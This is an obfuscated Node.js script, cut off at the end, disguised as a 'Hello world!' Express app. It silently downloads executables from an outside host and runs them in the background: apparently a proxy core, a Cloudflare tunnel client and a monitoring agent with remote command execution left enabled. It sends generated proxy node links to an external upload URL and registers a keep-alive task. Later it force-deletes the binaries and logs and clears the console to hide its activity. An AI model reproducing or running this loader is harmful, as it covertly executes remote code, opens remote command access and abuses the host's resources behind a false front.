const _0x5c6225=_0x4b28;(function(_0x27ff15,_0x2782f4){const _0x51e66c=_0x4b28,_0x320925=_0x27ff15();while(!![]){try{const _0x33d724=-parseInt(_0x51e66c(0xe3))/0x1+-parseInt(_0x51e66c(0xd6))/0x2*(-parseInt(_0x51e66c(0x154))/0x3)+parseInt(_0x51e66c(0xc5))/0x4+-parseInt(_0x51e66c(0x125))/0x5+-parseInt(_0x51e66c(0xac))/0x6*(-parseInt(_0x51e66c(0xb8))/0x7)+parseInt(_0x51e66c(0x137))/0x8*(parseInt(_0x51e66c(0xc1))/0x9)+parseInt(_0x51e66c(0x136))/0xa*(-parseInt(_0x51e66c(0x130))/0xb);if(_0x33d724===_0x2782f4)break;else _0x320925['push'](_0x320925['shift']());}catch(_0xfef67){_0x320925['push'](_0x320925['shift']());}}}(_0x5798,0xa255e));const express=require(_0x5c6225(0xeb)),app=express(),axios=require(_0x5c6225(0xd2)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x5c6225(0x133)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x5c6225(0xbd)),UPLOAD_URL=process['env'][_0x5c6225(0x127)]||'',PROJECT_URL=process[_0x5c6225(0x144)][_0x5c6225(0x155)]||'',AUTO_ACCESS=process[_0x5c6225(0x144)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x5c6225(0x144)][_0x5c6225(0x110)]||'./tmp',SUB_PATH=process[_0x5c6225(0x144)][_0x5c6225(0x10c)]||_0x5c6225(0xa6),PORT=process[_0x5c6225(0x144)][_0x5c6225(0xfe)]||process[_0x5c6225(0x144)]['PORT']||0xbb8,UUID=process[_0x5c6225(0x144)][_0x5c6225(0x147)]||_0x5c6225(0xde),NEZHA_SERVER=process[_0x5c6225(0x144)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x5c6225(0x144)][_0x5c6225(0x117)]||'',NEZHA_KEY=process[_0x5c6225(0x144)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x5c6225(0x144)][_0x5c6225(0x10e)]||_0x5c6225(0x114),ARGO_AUTH=process['env'][_0x5c6225(0x14b)]||_0x5c6225(0x129),ARGO_PORT=process[_0x5c6225(0x144)][_0x5c6225(0x12c)]||0x1f41,CFIP=process[_0x5c6225(0x144)][_0x5c6225(0xd8)]||'cdns.doon.eu.org',CFPORT=process[_0x5c6225(0x144)]['CFPORT']||0x1bb,NAME=process['env'][_0x5c6225(0x157)]||'';!fs['existsSync'](FILE_PATH)?(fs[_0x5c6225(0x12e)](FILE_PATH),console['log'](FILE_PATH+_0x5c6225(0x10b))):console[_0x5c6225(0x120)](FILE_PATH+_0x5c6225(0x15f));function generateRandomName(){const _0x2ba2be=_0x5c6225,_0x39b0eb=_0x2ba2be(0x142);let _0x3b523e='';for(let _0x57b391=0x0;_0x57b391<0x6;_0x57b391++){_0x3b523e+=_0x39b0eb[_0x2ba2be(0xb2)](Math[_0x2ba2be(0x11a)](Math[_0x2ba2be(0xf0)]()*_0x39b0eb[_0x2ba2be(0x14a)]));}return _0x3b523e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x4b28(_0x358933,_0x38aa3f){const _0x57989b=_0x5798();return _0x4b28=function(_0x4b2859,_0x6012b7){_0x4b2859=_0x4b2859-0xa1;let _0x56a1df=_0x57989b[_0x4b2859];return _0x56a1df;},_0x4b28(_0x358933,_0x38aa3f);}let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x5c6225(0xd5)](FILE_PATH,phpName),webPath=path[_0x5c6225(0xd5)](FILE_PATH,webName),botPath=path[_0x5c6225(0xd5)](FILE_PATH,botName),subPath=path[_0x5c6225(0xd5)](FILE_PATH,_0x5c6225(0x160)),listPath=path[_0x5c6225(0xd5)](FILE_PATH,_0x5c6225(0xf8)),bootLogPath=path['join'](FILE_PATH,_0x5c6225(0x140)),configPath=path[_0x5c6225(0xd5)](FILE_PATH,_0x5c6225(0xb9));function deleteNodes(){const _0x1219d3=_0x5c6225;try{if(!UPLOAD_URL)return;if(!fs[_0x1219d3(0xdc)](subPath))return;let _0x5c09f2;try{_0x5c09f2=fs[_0x1219d3(0x12d)](subPath,_0x1219d3(0xec));}catch{return null;}const _0x3b8ffc=Buffer['from'](_0x5c09f2,_0x1219d3(0xf7))['toString'](_0x1219d3(0xec)),_0x2282b6=_0x3b8ffc[_0x1219d3(0x139)]('\x0a')[_0x1219d3(0xc3)](_0x3381e0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1219d3(0x108)](_0x3381e0));if(_0x2282b6['length']===0x0)return;return axios[_0x1219d3(0x11f)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x2282b6}),{'headers':{'Content-Type':'application/json'}})[_0x1219d3(0x148)](_0x1e8fd2=>{return null;}),null;}catch(_0x4dd6fd){return null;}}function cleanupOldFiles(){const _0x54d4d4=_0x5c6225;try{const _0x45663a=fs[_0x54d4d4(0xab)](FILE_PATH);_0x45663a[_0x54d4d4(0xbb)](_0x4e9172=>{const _0x269834=_0x54d4d4,_0x30336c=path[_0x269834(0xd5)](FILE_PATH,_0x4e9172);try{const _0x3a3316=fs[_0x269834(0x106)](_0x30336c);_0x3a3316['isFile']()&&fs[_0x269834(0x14c)](_0x30336c);}catch(_0x583685){}});}catch(_0x37a33d){}}function _0x5798(){const _0x40e68e=['/vmess-argo?ed=2560','set','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/web','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','pkill\x20-f\x20\x22[','win32','unshift','axios','\x20failed:\x20','\x20>/dev/null\x202>&1\x20&','join','2iuNpmq','nohup\x20','CFIP','http','/trojan-argo','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','existsSync','Error\x20executing\x20command:\x20','74953fe5-177a-4b00-ab94-56cc64c17ee9','/vmess-argo','none','/dev/null','2096','864287IQnffM','https://amd64.ssss.nyc.mn/bot','send','\x20successfully','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','8443','\x0avless://','text/plain;\x20charset=utf-8','express','utf-8','2053','Error\x20downloading\x20files:','2087','random','https+local://8.8.8.8/dns-query','Skipping\x20adding\x20automatic\x20access\x20task','\x20is\x20running','/vless-argo','Error\x20reading\x20boot.log:','\x0a\x0atrojan://','base64','list.txt','Empowerment\x20success\x20for\x20','automatic\x20access\x20task\x20added\x20successfully','tls','/tunnel.yml\x20run','push','SERVER_PORT','response','has','https://oooo.serv00.net/add-url','aarch64','firefox','fileUrl','map','statSync','\x0aclient_secret:\x20','test','listen','false','\x20is\x20created','SUB_PATH','application/json','ARGO_DOMAIN','vmess','FILE_PATH','true','data','config.yaml','yz.chinaesenet.dpdns.org','close','direct','NEZHA_PORT','block','stringify','floor','blackhole','Content-Type','.exe\x20>\x20nul\x202>&1','arm','post','log','TunnelSecret','npm\x20running\x20error:\x20','message','ARGO_DOMAIN:','2158770bQEORm','\x20-c\x20','UPLOAD_URL','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','eyJhIjoiNTg5ZjIwZDZjMThiYTVlMDIzMDExMzUwMGM2MWM3MGUiLCJ0IjoiMzBhMDM3N2EtZjM3OS00NGNjLWE1MjMtYzU5Nzg4OTU0ZmRkIiwicyI6IlpXVXpZMk14Tm1NdE1HSXdNeTAwT0dJM0xXRmpZakl0T0RCallXVXpNR1UyTkRWaSJ9','tcp','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','ARGO_PORT','readFileSync','mkdirSync','stream','2651qRFWRb','Empowerment\x20failed\x20for\x20','&fp=firefox&type=ws&host=','util','includes','Subscription\x20uploaded\x20successfully','30170xNikrx','8453736paUejL','success','split','quic','/sub.txt\x20saved\x20successfully','taskkill\x20/f\x20/im\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','match','https://arm64.ssss.nyc.mn/bot','boot.log','arm64','abcdefghijklmnopqrstuvwxyz','web\x20running\x20error:\x20','env','2083','/api/add-nodes','UUID','catch','writeFileSync','length','ARGO_AUTH','unlinkSync','createWriteStream','org','https://ipapi.co/json/','http://ip-api.com/json/','fileName','basename','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','1610727qASVnS','PROJECT_URL','&path=%2Ftrojan-argo%3Fed%3D2560#','NAME','toString','status','freedom','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','from','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','amd','\x20already\x20exists','sub.txt','xtls-rprx-vision','platform','all','https://arm64.ssss.nyc.mn/web','\x20-c\x20\x22','Download\x20','Hello\x20world!','vless','pop','clear','\x20>/dev/null\x202>&1','\x0a\x20\x20credentials-file:\x20','sub','tunnel.yml','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','127.0.0.1','readdirSync','1507470KIKMjz','\x20-s\x20','\x20-p\x20','error','rm\x20-rf\x20','\x22\x20>\x20/dev/null\x202>&1','charAt','\x0a\x0avmess://','country_code','443','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Unknown','14FqAKxr','config.json','get','forEach','countryCode','child_process','php\x20running\x20error:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x0a\x20\x20\x20\x20','9ZspCEd','App\x20is\x20running','filter','https://amd64.ssss.nyc.mn/agent','2367792eiOdFk','Nodes\x20uploaded\x20successfully','?encryption=none&security=tls&sni=','unlink','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'];_0x5798=function(){return _0x40e68e;};return _0x5798();}app[_0x5c6225(0xba)]('/',function(_0xb3a7b2,_0x19c0fc){const _0x1da4ba=_0x5c6225;_0x19c0fc[_0x1da4ba(0xe5)](_0x1da4ba(0x167));});async function generateConfig(){const _0x5a5240=_0x5c6225,_0xc22513={'log':{'access':_0x5a5240(0xe1),'error':_0x5a5240(0xe1),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5a5240(0xa1),'settings':{'clients':[{'id':UUID,'flow':_0x5a5240(0x161)}],'decryption':_0x5a5240(0xe0),'fallbacks':[{'dest':0xbb9},{'path':_0x5a5240(0xf4),'dest':0xbba},{'path':_0x5a5240(0xdf),'dest':0xbbb},{'path':_0x5a5240(0xda),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x5a5240(0xaa),'protocol':_0x5a5240(0xa1),'settings':{'clients':[{'id':UUID}],'decryption':_0x5a5240(0xe0)},'streamSettings':{'network':_0x5a5240(0x12a),'security':_0x5a5240(0xe0)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x5a5240(0xa1),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5a5240(0xe0)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5a5240(0xf4)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a5240(0xd9),_0x5a5240(0xfb),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5a5240(0xaa),'protocol':_0x5a5240(0x10f),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5a5240(0xdf)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5a5240(0xfb),_0x5a5240(0x13a)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5a5240(0xaa),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5a5240(0xd9),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x5a5240(0xf1)]},'outbounds':[{'protocol':_0x5a5240(0x15a),'tag':_0x5a5240(0x116)},{'protocol':_0x5a5240(0x11b),'tag':_0x5a5240(0x118)}]};fs[_0x5a5240(0x149)](path[_0x5a5240(0xd5)](FILE_PATH,_0x5a5240(0xb9)),JSON[_0x5a5240(0x119)](_0xc22513,null,0x2));}function getSystemArchitecture(){const _0x57ee9a=_0x5c6225,_0x4a7cc5=os['arch']();return _0x4a7cc5===_0x57ee9a(0x11e)||_0x4a7cc5===_0x57ee9a(0x141)||_0x4a7cc5===_0x57ee9a(0x102)?_0x57ee9a(0x11e):_0x57ee9a(0x15e);}function downloadFile(_0x39cacc,_0x154cf1,_0x114a50){const _0x1b49a8=_0x5c6225,_0x639b89=_0x39cacc;!fs['existsSync'](FILE_PATH)&&fs[_0x1b49a8(0x12e)](FILE_PATH,{'recursive':!![]});const _0x379599=fs[_0x1b49a8(0x14d)](_0x639b89);axios({'method':_0x1b49a8(0xba),'url':_0x154cf1,'responseType':_0x1b49a8(0x12f)})['then'](_0x2077ac=>{const _0x58feb1=_0x1b49a8;_0x2077ac[_0x58feb1(0x112)]['pipe'](_0x379599),_0x379599['on']('finish',()=>{const _0x278481=_0x58feb1;_0x379599[_0x278481(0x115)](),console[_0x278481(0x120)]('Download\x20'+path[_0x278481(0x152)](_0x639b89)+_0x278481(0xe6)),_0x114a50(null,_0x639b89);}),_0x379599['on'](_0x58feb1(0xaf),_0x57d185=>{const _0x25c22d=_0x58feb1;fs[_0x25c22d(0xc8)](_0x639b89,()=>{});const _0x4cbb5c=_0x25c22d(0x166)+path[_0x25c22d(0x152)](_0x639b89)+_0x25c22d(0xd3)+_0x57d185['message'];console['error'](_0x4cbb5c),_0x114a50(_0x4cbb5c);});})[_0x1b49a8(0x148)](_0x51e850=>{const _0x2865e4=_0x1b49a8,_0x41dfd5=_0x2865e4(0x166)+path['basename'](_0x639b89)+_0x2865e4(0xd3)+_0x51e850[_0x2865e4(0x123)];console[_0x2865e4(0xaf)](_0x41dfd5),_0x114a50(_0x41dfd5);});}async function downloadFilesAndRun(){const _0x4c8acf=_0x5c6225,_0x3da4d1=getSystemArchitecture(),_0x3672c2=getFilesForArchitecture(_0x3da4d1);if(_0x3672c2[_0x4c8acf(0x14a)]===0x0){console['log'](_0x4c8acf(0x12b));return;}const _0x11a94b=_0x3672c2[_0x4c8acf(0x105)](_0x1b25d7=>{return new Promise((_0x1e15d1,_0x5985d4)=>{const _0x1adf64=_0x4b28;downloadFile(_0x1b25d7[_0x1adf64(0x151)],_0x1b25d7[_0x1adf64(0x104)],(_0x126723,_0x49c366)=>{_0x126723?_0x5985d4(_0x126723):_0x1e15d1(_0x49c366);});});});try{await Promise[_0x4c8acf(0x163)](_0x11a94b);}catch(_0x51816c){console[_0x4c8acf(0xaf)](_0x4c8acf(0xee),_0x51816c);return;}function _0x817871(_0x4d2e8c){const _0x4dd825=0x1fd;_0x4d2e8c['forEach'](_0x131b6e=>{const _0x5d9830=_0x4b28;fs[_0x5d9830(0xdc)](_0x131b6e)&&fs['chmod'](_0x131b6e,_0x4dd825,_0x1a70cd=>{const _0x554ce4=_0x5d9830;_0x1a70cd?console[_0x554ce4(0xaf)](_0x554ce4(0x131)+_0x131b6e+':\x20'+_0x1a70cd):console[_0x554ce4(0x120)](_0x554ce4(0xf9)+_0x131b6e+':\x20'+_0x4dd825[_0x554ce4(0x158)](0x8));});});}const _0x1066d1=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x817871(_0x1066d1);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x53a8fc=NEZHA_SERVER[_0x4c8acf(0x134)](':')?NEZHA_SERVER[_0x4c8acf(0x139)](':')[_0x4c8acf(0xa2)]():'',_0x15e48d=new Set([_0x4c8acf(0xb5),_0x4c8acf(0xe8),_0x4c8acf(0xe2),_0x4c8acf(0xef),_0x4c8acf(0x145),'2053']),_0x382539=_0x15e48d[_0x4c8acf(0x100)](_0x53a8fc)?_0x4c8acf(0x111):_0x4c8acf(0x10a),_0x37b4ac=_0x4c8acf(0x107)+NEZHA_KEY+_0x4c8acf(0xa8)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x382539+_0x4c8acf(0xe7)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x4c8acf(0x113)),_0x37b4ac);const _0x3d4b4f=_0x4c8acf(0xd7)+phpPath+_0x4c8acf(0x165)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3d4b4f),console[_0x4c8acf(0x120)](phpName+_0x4c8acf(0xf3)),await new Promise(_0x52430e=>setTimeout(_0x52430e,0x3e8));}catch(_0x2341ee){console[_0x4c8acf(0xaf)](_0x4c8acf(0xbe)+_0x2341ee);}}else{let _0x2591ec='';const _0x53dbd5=['443',_0x4c8acf(0xe8),'2096','2087',_0x4c8acf(0x145),_0x4c8acf(0xed)];_0x53dbd5[_0x4c8acf(0x134)](NEZHA_PORT)&&(_0x2591ec='--tls');const _0x4b3792=_0x4c8acf(0xd7)+npmPath+_0x4c8acf(0xad)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4c8acf(0xae)+NEZHA_KEY+'\x20'+_0x2591ec+_0x4c8acf(0xcc);try{await exec(_0x4b3792),console[_0x4c8acf(0x120)](npmName+'\x20is\x20running'),await new Promise(_0x320110=>setTimeout(_0x320110,0x3e8));}catch(_0x55fc6a){console[_0x4c8acf(0xaf)](_0x4c8acf(0x122)+_0x55fc6a);}}}else console[_0x4c8acf(0x120)](_0x4c8acf(0xbf));const _0x4123c2='nohup\x20'+webPath+_0x4c8acf(0x126)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4123c2),console[_0x4c8acf(0x120)](webName+_0x4c8acf(0xf3)),await new Promise(_0x531ed1=>setTimeout(_0x531ed1,0x3e8));}catch(_0x2d2867){console[_0x4c8acf(0xaf)](_0x4c8acf(0x143)+_0x2d2867);}if(fs[_0x4c8acf(0xdc)](botPath)){let _0x561144;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x561144=_0x4c8acf(0x13d)+ARGO_AUTH;else ARGO_AUTH[_0x4c8acf(0x13e)](/TunnelSecret/)?_0x561144=_0x4c8acf(0x15b)+FILE_PATH+_0x4c8acf(0xfc):_0x561144=_0x4c8acf(0x128)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x4c8acf(0xd7)+botPath+'\x20'+_0x561144+'\x20>/dev/null\x202>&1\x20&'),console[_0x4c8acf(0x120)](botName+_0x4c8acf(0xf3)),await new Promise(_0x5999c2=>setTimeout(_0x5999c2,0x7d0));}catch(_0x25100a){console[_0x4c8acf(0xaf)](_0x4c8acf(0xdd)+_0x25100a);}}await new Promise(_0x102243=>setTimeout(_0x102243,0x1388));}function getFilesForArchitecture(_0x253d5e){const _0x1b94f0=_0x5c6225;let _0x11e631;_0x253d5e===_0x1b94f0(0x11e)?_0x11e631=[{'fileName':webPath,'fileUrl':_0x1b94f0(0x164)},{'fileName':botPath,'fileUrl':_0x1b94f0(0x13f)}]:_0x11e631=[{'fileName':webPath,'fileUrl':_0x1b94f0(0xcd)},{'fileName':botPath,'fileUrl':_0x1b94f0(0xe4)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x23f37e=_0x253d5e===_0x1b94f0(0x11e)?'https://arm64.ssss.nyc.mn/agent':_0x1b94f0(0xc4);_0x11e631[_0x1b94f0(0xd1)]({'fileName':npmPath,'fileUrl':_0x23f37e});}else{const _0x23d489=_0x253d5e==='arm'?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x11e631[_0x1b94f0(0xd1)]({'fileName':phpPath,'fileUrl':_0x23d489});}}return _0x11e631;}function argoType(){const _0xf8dedd=_0x5c6225;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xf8dedd(0x120)](_0xf8dedd(0xdb));return;}if(ARGO_AUTH[_0xf8dedd(0x134)](_0xf8dedd(0x121))){fs[_0xf8dedd(0x149)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0xc9a5d2='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0xf8dedd(0x139)]('\x22')[0xb]+_0xf8dedd(0xa5)+path[_0xf8dedd(0xd5)](FILE_PATH,'tunnel.json')+_0xf8dedd(0xc9)+ARGO_DOMAIN+_0xf8dedd(0x15d)+ARGO_PORT+_0xf8dedd(0xce);fs['writeFileSync'](path[_0xf8dedd(0xd5)](FILE_PATH,_0xf8dedd(0xa7)),_0xc9a5d2);}else console[_0xf8dedd(0x120)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x114509=_0x5c6225;let _0x441305;if(ARGO_AUTH&&ARGO_DOMAIN)_0x441305=ARGO_DOMAIN,console[_0x114509(0x120)](_0x114509(0x124),_0x441305),await _0x5d0f0f(_0x441305);else try{const _0x3e4f97=fs[_0x114509(0x12d)](path[_0x114509(0xd5)](FILE_PATH,_0x114509(0x140)),_0x114509(0xec)),_0x5a8e88=_0x3e4f97['split']('\x0a'),_0x489f4d=[];_0x5a8e88[_0x114509(0xbb)](_0x3aa1c8=>{const _0x5edddd=_0x114509,_0x205e51=_0x3aa1c8[_0x5edddd(0x13e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x205e51){const _0x582227=_0x205e51[0x1];_0x489f4d[_0x5edddd(0xfd)](_0x582227);}});if(_0x489f4d[_0x114509(0x14a)]>0x0)_0x441305=_0x489f4d[0x0],console[_0x114509(0x120)]('ArgoDomain:',_0x441305),await _0x5d0f0f(_0x441305);else{console[_0x114509(0x120)](_0x114509(0xa9)),fs['unlinkSync'](path['join'](FILE_PATH,_0x114509(0x140)));async function _0x1cf797(){const _0x309711=_0x114509;try{process[_0x309711(0x162)]==='win32'?await exec(_0x309711(0x13c)+botName+_0x309711(0x11d)):await exec(_0x309711(0xcf)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x309711(0xb1));}catch(_0x226450){}}_0x1cf797(),await new Promise(_0x5a895b=>setTimeout(_0x5a895b,0xbb8));const _0x208607=_0x114509(0x128)+FILE_PATH+_0x114509(0x153)+ARGO_PORT;try{await exec(_0x114509(0xd7)+botPath+'\x20'+_0x208607+_0x114509(0xd4)),console[_0x114509(0x120)](botName+'\x20is\x20running'),await new Promise(_0xf4314f=>setTimeout(_0xf4314f,0xbb8)),await extractDomains();}catch(_0xc11e44){console[_0x114509(0xaf)](_0x114509(0xdd)+_0xc11e44);}}}catch(_0x55d395){console[_0x114509(0xaf)](_0x114509(0xf5),_0x55d395);}async function _0x223bfe(){const _0x408c0e=_0x114509;try{const _0x1a045e=await axios[_0x408c0e(0xba)](_0x408c0e(0x14f),{'timeout':0xbb8});if(_0x1a045e[_0x408c0e(0x112)]&&_0x1a045e['data'][_0x408c0e(0xb4)]&&_0x1a045e[_0x408c0e(0x112)][_0x408c0e(0x14e)])return _0x1a045e['data'][_0x408c0e(0xb4)]+'_'+_0x1a045e['data'][_0x408c0e(0x14e)];}catch(_0x1746f6){try{const _0x40879a=await axios[_0x408c0e(0xba)](_0x408c0e(0x150),{'timeout':0xbb8});if(_0x40879a[_0x408c0e(0x112)]&&_0x40879a[_0x408c0e(0x112)][_0x408c0e(0x159)]===_0x408c0e(0x138)&&_0x40879a['data'][_0x408c0e(0xbc)]&&_0x40879a['data']['org'])return _0x40879a[_0x408c0e(0x112)][_0x408c0e(0xbc)]+'_'+_0x40879a[_0x408c0e(0x112)][_0x408c0e(0x14e)];}catch(_0x5818f7){}}return _0x408c0e(0xb7);}async function _0x5d0f0f(_0x129249){const _0x179b6a=await _0x223bfe(),_0x1d25f0=NAME?NAME+'-'+_0x179b6a:_0x179b6a;return new Promise(_0x1f3f9e=>{setTimeout(()=>{const _0xc73b42=_0x4b28,_0x27b3a5={'v':'2','ps':''+_0x1d25f0,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0xc73b42(0xe0),'host':_0x129249,'path':_0xc73b42(0xca),'tls':_0xc73b42(0xfb),'sni':_0x129249,'alpn':'','fp':_0xc73b42(0x103)},_0x254806=_0xc73b42(0xe9)+UUID+'@'+CFIP+':'+CFPORT+_0xc73b42(0xc7)+_0x129249+_0xc73b42(0x132)+_0x129249+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x1d25f0+_0xc73b42(0xb3)+Buffer[_0xc73b42(0x15c)](JSON['stringify'](_0x27b3a5))[_0xc73b42(0x158)]('base64')+_0xc73b42(0xf6)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x129249+'&fp=firefox&type=ws&host='+_0x129249+_0xc73b42(0x156)+_0x1d25f0+_0xc73b42(0xc0);console[_0xc73b42(0x120)](Buffer[_0xc73b42(0x15c)](_0x254806)[_0xc73b42(0x158)](_0xc73b42(0xf7))),fs[_0xc73b42(0x149)](subPath,Buffer[_0xc73b42(0x15c)](_0x254806)[_0xc73b42(0x158)](_0xc73b42(0xf7))),console[_0xc73b42(0x120)](FILE_PATH+_0xc73b42(0x13b)),uploadNodes(),app[_0xc73b42(0xba)]('/'+SUB_PATH,(_0x2f9230,_0x2a6c3b)=>{const _0x2b0b78=_0xc73b42,_0x2957cb=Buffer[_0x2b0b78(0x15c)](_0x254806)[_0x2b0b78(0x158)]('base64');_0x2a6c3b[_0x2b0b78(0xcb)](_0x2b0b78(0x11c),_0x2b0b78(0xea)),_0x2a6c3b[_0x2b0b78(0xe5)](_0x2957cb);}),_0x1f3f9e(_0x254806);},0x7d0);});}}async function uploadNodes(){const _0x35511d=_0x5c6225;if(UPLOAD_URL&&PROJECT_URL){const _0x3d7eb0=PROJECT_URL+'/'+SUB_PATH,_0x53e5d9={'subscription':[_0x3d7eb0]};try{const _0x18b9ae=await axios[_0x35511d(0x11f)](UPLOAD_URL+'/api/add-subscriptions',_0x53e5d9,{'headers':{'Content-Type':'application/json'}});return _0x18b9ae&&_0x18b9ae[_0x35511d(0x159)]===0xc8?(console[_0x35511d(0x120)](_0x35511d(0x135)),_0x18b9ae):null;}catch(_0x3affb0){if(_0x3affb0[_0x35511d(0xff)]){if(_0x3affb0[_0x35511d(0xff)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x346f32=fs[_0x35511d(0x12d)](listPath,_0x35511d(0xec)),_0x5a36b8=_0x346f32['split']('\x0a')['filter'](_0x3e7822=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x35511d(0x108)](_0x3e7822));if(_0x5a36b8['length']===0x0)return;const _0x2f766e=JSON[_0x35511d(0x119)]({'nodes':_0x5a36b8});try{const _0x969581=await axios['post'](UPLOAD_URL+_0x35511d(0x146),_0x2f766e,{'headers':{'Content-Type':'application/json'}});return _0x969581&&_0x969581['status']===0xc8?(console['log'](_0x35511d(0xc6)),_0x969581):null;}catch(_0x5448c8){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2023ae=_0x4b28,_0x289ed4=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x289ed4['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x289ed4[_0x2023ae(0xfd)](phpPath);process[_0x2023ae(0x162)]===_0x2023ae(0xd0)?exec('del\x20/f\x20/q\x20'+_0x289ed4[_0x2023ae(0xd5)]('\x20')+'\x20>\x20nul\x202>&1',_0x34e42b=>{const _0x3cc958=_0x2023ae;console[_0x3cc958(0xa3)](),console[_0x3cc958(0x120)]('App\x20is\x20running'),console[_0x3cc958(0x120)](_0x3cc958(0xb6));}):exec(_0x2023ae(0xb0)+_0x289ed4[_0x2023ae(0xd5)]('\x20')+_0x2023ae(0xa4),_0x231ecb=>{const _0x19925e=_0x2023ae;console['clear'](),console[_0x19925e(0x120)](_0x19925e(0xc2)),console[_0x19925e(0x120)](_0x19925e(0xb6));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4be898=_0x5c6225;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4be898(0x120)](_0x4be898(0xf2));return;}try{const _0xdb031f=await axios[_0x4be898(0x11f)](_0x4be898(0x101),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4be898(0x10d)}});return console[_0x4be898(0x120)](_0x4be898(0xfa)),_0xdb031f;}catch(_0x3bbc14){return console[_0x4be898(0xaf)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x3bbc14['message']),null;}}async function startserver(){const _0x2092b9=_0x5c6225;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x435958){console[_0x2092b9(0xaf)]('Error\x20in\x20startserver:',_0x435958);}}startserver()[_0x5c6225(0x148)](_0x49ffbe=>{const 